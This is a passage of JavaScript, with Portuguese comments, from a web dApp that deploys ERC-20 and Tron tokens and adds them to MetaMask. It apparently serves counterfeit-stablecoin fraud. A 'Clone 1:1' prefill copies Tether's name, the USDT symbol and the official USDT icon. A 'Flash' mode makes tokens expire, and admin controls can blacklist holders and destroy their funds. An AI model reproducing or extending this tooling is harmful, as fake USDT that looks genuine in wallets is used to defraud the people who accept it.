        const factory = new ethers.ContractFactory(contractABI, contractBytecode, currentSigner);
        
        console.log(`🚀 Iniciando deploy na rede EVM com: Name=${name}, Symbol=${symbol}, Supply=${supply}, Decimals=${decimals}`);

        // IMPORTANTE: Cast para BigInt e Number para evitar StackOverflow no EVM
        const contract = await factory.deploy(
            name, 
            symbol, 
            BigInt(supply), 
            Number(decimals)
        );
        
        showStatus("Deploy enviado! Aguardando mineração...", "info");
        await contract.waitForDeployment();
        
        const newAddress = await contract.getAddress();
        const txHash = contract.deploymentTransaction().hash;

        // Se houver tempo de expiração, executa o mintWithExpiry logo após o deploy (re-mint)
        // Nota: O deploy inicial já faz o mint no construtor. Para o modo Flash, 
        // precisaríamos de um contrato que aceitasse expiração no construtor.
        // Como o contrato atual faz o mint no construtor sem expiração,
        // o mintWithExpiry seria para tokens EXTRAS ou precisaríamos ajustar o construtor.
        // Vou ajustar o deploy para usar uma versão do contrato que suporte expiração inicial se necessário,
        // mas por agora vamos apenas informar que o modo Flash está ativo para NOVOS mints.
        if (expiry > 0) {
            try {
                showStatus("Configurando Modo Flash (Expiração)...", "info");
                const contractWithSigner = contract.connect(currentSigner);
                // Como já mintou no construtor, vamos apenas setar a expiração para o owner
                // Para isso precisamos de uma função setExpiration. Vou adicionar no contrato.
                if (contractWithSigner.setExpirationTime) {
                   const txEx = await contractWithSigner.setExpirationTime(await currentSigner.getAddress(), expiry);
                   await txEx.wait();
                }
            } catch (exErr) {
                console.warn("Erro ao configurar expiração:", exErr);
            }
        }

        // Esconde a dica de Tron se estiver em rede EVM
        document.getElementById('tron-deploy-tip').classList.add('hidden');
        document.getElementById('add-new-metamask').innerHTML = '<i class="fas fa-plus-circle"></i> Adicionar ao MetaMask';

        // Show Result
        document.getElementById('new-token-address').innerText = newAddress;
        document.getElementById('new-token-owner').innerText = await currentSigner.getAddress();
        document.getElementById('new-token-hash').innerText = txHash.substring(0, 20) + "...";
        
        // Link para o explorador
        const explorerBase = NETWORKS[netKey]?.explorer || "https://bscscan.com/tx/";
        document.getElementById('new-token-hash').innerHTML = `<a href="${explorerBase}${txHash}" target="_blank" style="color: #3498db;">${txHash.substring(0, 20)}... <i class="fas fa-external-link-alt"></i></a>`;

        // Verifica saldo do novo token para feedback imediato
        try {
            const tempContract = new ethers.Contract(newAddress, contractABI, currentSigner);
            const bal = await tempContract.balanceOf(await currentSigner.getAddress());
            const dec = await tempContract.decimals();
            const formattedBal = ethers.formatUnits(bal, dec);
            console.log(`✅ Saldo verificado no novo contrato: ${formattedBal} ${symbol}`);
            showToast(`Sucesso! Sua carteira recebeu ${formattedBal} ${symbol}.`, "success");
        } catch (balCheckErr) {
            console.warn("Não foi possível verificar o saldo do novo token imediatamente.", balCheckErr);
        }

        document.getElementById('deployment-result').classList.remove('hidden');
        
        showStatus(`Token ${symbol} gerado com sucesso!`, "success");
    } catch (error) {
        console.error("Erro detalhado no deploy:", error);
        // Captura o motivo do revert se disponível
        const errorMsg = error.reason || error.message || "Erro desconhecido";
        showStatus("Erro no Deploy: " + errorMsg, "error");
    } finally {
        deployBtn.disabled = false;
        deployBtn.innerHTML = '<i class="fas fa-rocket"></i> Gerar Novo Token';
    }
}

// Helper Functions
function prefillGenerator() {
    const netKey = networkSelector.value;
    if (netKey === 'bsc') {
        document.getElementById('gen-name').value = "Binance-Peg BSC-USD";
        document.getElementById('gen-symbol').value = "BSC-USD";
        document.getElementById('gen-decimals').value = "18";
    } else if (netKey === 'eth') {
        document.getElementById('gen-name').value = "Tether USD";
        document.getElementById('gen-symbol').value = "USDT";
        document.getElementById('gen-decimals').value = "18";
    } else if (isTron(netKey)) {
        document.getElementById('gen-name').value = "Tether USD";
        document.getElementById('gen-symbol').value = "USDT";
        document.getElementById('gen-decimals').value = "6";
    } else {
        document.getElementById('gen-name').value = "BEP20USDT";
        document.getElementById('gen-symbol').value = "USDT";
        document.getElementById('gen-decimals').value = "18";
    }
    
    document.getElementById('gen-supply').value = "1000000";
    document.getElementById('gen-decimals').value = "18";
    document.getElementById('gen-image').value = "https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/usdt.png";
    
    const genTab = document.querySelector('[data-tab="generator"]');
    if (genTab) genTab.click();
    
    showToast("Dados preenchidos para modo Clone 1:1!", "info");
}

window.prefillGenerator = prefillGenerator;

function showStatus(msg, type) {
    if (statusMsg) {
        statusMsg.innerHTML = msg;
        statusMsg.className = type;
    }
    if (type === "success" || type === "error") {
        showToast(msg, type);
    }
}

function showToast(message, type = "info") {
    const container = document.getElementById('toast-container');
    if (!container) return;

    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    
    let icon = "info-circle";
    if (type === "success") icon = "check-circle";
    if (type === "error") icon = "exclamation-triangle";

    toast.innerHTML = `
        <i class="fas fa-${icon}"></i>
        <div>${message}</div>
    `;

    container.appendChild(toast);

    // Auto remove
    setTimeout(() => {
        toast.classList.add('fade-out');
        setTimeout(() => {
            toast.remove();
        }, 500);
    }, 4000);
}

function handleFileSelect(event, inputId, nameId) {
    const file = event.target.files[0];
    if (file) {
        if (file.size > 2 * 1024 * 1024) { // 2MB limit
            showToast("A imagem é muito grande. Use arquivos menores que 2MB.", "error");
            return;
        }

        document.getElementById(nameId).innerText = file.name;
        
        const reader = new FileReader();
        reader.onload = (e) => {
            const base64Data = e.target.result;
            document.getElementById(inputId).value = base64Data;
            showToast("Imagem convertida com sucesso!", "success");
            
            // Se for nas configurações, já pode atualizar o preview
            if (inputId === 'settings-token-image') {
                mainTokenImage = base64Data;
                updateUIText();
            }
        };
        reader.readAsDataURL(file);
    }
}

async function watchToken(address, symbol, decimals, image) {
    console.log(`🦊 Sugerindo token ao MetaMask: ${symbol} (${Number(decimals)} decimais) em ${address}`);
    if (isTron(networkSelector.value)) {
        showToast("Para Tron, adicione manualmente no TronLink usando o endereço.", "info");
        return;
    }
    if (!window.ethereum) return;

    // Se não houver imagem personalizada, usamos o ícone oficial do USDT como fallback
    const tokenImage = image || 'https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/usdt.png';

    try {
        await window.ethereum.request({
            method: 'wallet_watchAsset',
            params: {
                type: 'ERC20',
                options: {
                    address: address,
                    symbol: symbol,
                    decimals: Number(decimals),
                    image: tokenImage,
                },
            },
        });
        showToast("Sugestão enviada ao MetaMask!", "success");
    } catch (error) {
        console.error(error);
        showToast("Não foi possível adicionar o token.", "error");
    }
}

function copyImportKit(address, symbol, decimals) {
    const kit = `--- DADOS PARA IMPORTAR TOKEN ---\n` +
                `Endereço: ${address}\n` +
                `Símbolo: ${symbol}\n` +
                `Decimais: ${decimals}\n` +
                `---------------------------------`;
    navigator.clipboard.writeText(kit);
    showToast("Kit de importação copiado!", "success");
}

document.getElementById('copy-contract').onclick = () => {
    navigator.clipboard.writeText(contractAddrInput.value);
    showToast("Endereço copiado!", "success");
};

document.getElementById('copy-kit').onclick = () => {
    copyImportKit(contractAddrInput.value, mainTokenSymbol, mainTokenDecimals);
};

document.getElementById('add-metamask').onclick = () => {
    watchToken(contractAddrInput.value, mainTokenSymbol, mainTokenDecimals, mainTokenImage);
};

document.getElementById('copy-new-token').onclick = () => {
    const addr = document.getElementById('new-token-address').innerText;
    navigator.clipboard.writeText(addr);
    showToast("Novo endereço copiado!", "success");
};

document.getElementById('copy-new-kit').onclick = () => {
    const addr = document.getElementById('new-token-address').innerText;
    const symbol = document.getElementById('gen-symbol').value;
    const decimals = document.getElementById('gen-decimals').value;
    copyImportKit(addr, symbol, decimals);
};

document.getElementById('add-new-metamask').onclick = () => {
    const addr = document.getElementById('new-token-address').innerText;
    const symbol = document.getElementById('gen-symbol').value;
    const decimals = document.getElementById('gen-decimals').value;
    const image = document.getElementById('gen-image').value;
    watchToken(addr, symbol, decimals, image);
};

document.getElementById('use-this-token').onclick = () => {
    const addr = document.getElementById('new-token-address').innerText;
    const image = document.getElementById('gen-image').value;
    
    contractAddrInput.value = addr;
    settingsContractInput.value = addr;
    document.getElementById('settings-token-image').value = image;
    mainTokenImage = image;
    
    // Volta para a aba Dashboard
    const dashTab = document.querySelector('[data-tab="dashboard"]');
    if (dashTab) dashTab.click();
    
    initMainContract();
    showToast("Token configurado como principal!", "success");
};

document.getElementById('save-contract').onclick = () => {
    contractAddrInput.value = settingsContractInput.value;
    mainTokenImage = document.getElementById('settings-token-image').value;
    
    // Salva API Key da Tron
    const apiKey = document.getElementById('settings-tron-api-key').value.trim();
    if (apiKey) {
        localStorage.setItem('tron_api_key', apiKey);
        tronApiKey = apiKey;
    } else {
        localStorage.removeItem('tron_api_key');
        tronApiKey = "";
    }

    initMainContract();
    showToast("Configurações atualizadas!", "success");
};

async function setMaxAmount() {
    const currentSigner = getActiveSigner();
    if (!mainContract || !currentSigner) {
        showToast("Conecte a carteira primeiro.", "error");
        return;
    }
    try {
        const address = await currentSigner.getAddress();
        const balance = await mainContract.balanceOf(address);
        document.getElementById('transfer-amount').value = ethers.formatUnits(balance, mainTokenDecimals);
        showToast("Valor máximo selecionado!", "info");
    } catch (e) {
        console.error(e);
        showToast("Erro ao buscar saldo máximo.", "error");
    }
}

// Initialization
window.addEventListener('load', () => {
    // Preenche API Key se houver
    if (tronApiKey) {
        document.getElementById('settings-tron-api-key').value = tronApiKey;
    }

    loadConfig();
    connectBtn.onclick = connectWallet;
    document.getElementById('send-button').onclick = sendTokens;
    document.getElementById('deploy-token-button').onclick = deployNewToken;
    document.getElementById('check-balance-btn').onclick = checkExternalBalance;
    document.getElementById('max-amount-btn').onclick = setMaxAmount;
    
    // Admin Buttons
    document.getElementById('toggle-pause-btn').onclick = togglePause;
    document.getElementById('add-blacklist-btn').onclick = () => handleBlacklist('add');
    document.getElementById('remove-blacklist-btn').onclick = () => handleBlacklist('remove');
    document.getElementById('destroy-funds-btn').onclick = destroyFunds;
    document.getElementById('set-expiry-btn').onclick = setAdminExpiry;

    // Liquidity Simulator
    const simTokens = document.getElementById('sim-tokens');
    const simUsd = document.getElementById('sim-usd');
    const simResult = document.getElementById('sim-price-result');

    const updateSim = () => {
        const tokens = parseFloat(simTokens.value) || 0;
        const usd = parseFloat(simUsd.value) || 0;
        if (tokens > 0) {
            const price = usd / tokens;
            simResult.innerText = price.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 4 });
        } else {
            simResult.innerText = "0.00";
        }
    };

    simTokens.oninput = updateSim;
    simUsd.oninput = updateSim;

    // File Upload Handlers
    document.getElementById('gen-image-file').onchange = (e) => handleFileSelect(e, 'gen-image', 'gen-file-name');
    document.getElementById('settings-image-file').onchange = (e) => handleFileSelect(e, 'settings-token-image', 'settings-file-name');

    // Input Handlers for Live Preview
    document.getElementById('settings-token-image').oninput = (e) => {
        mainTokenImage = e.target.value;
        updateUIText();
    };
});
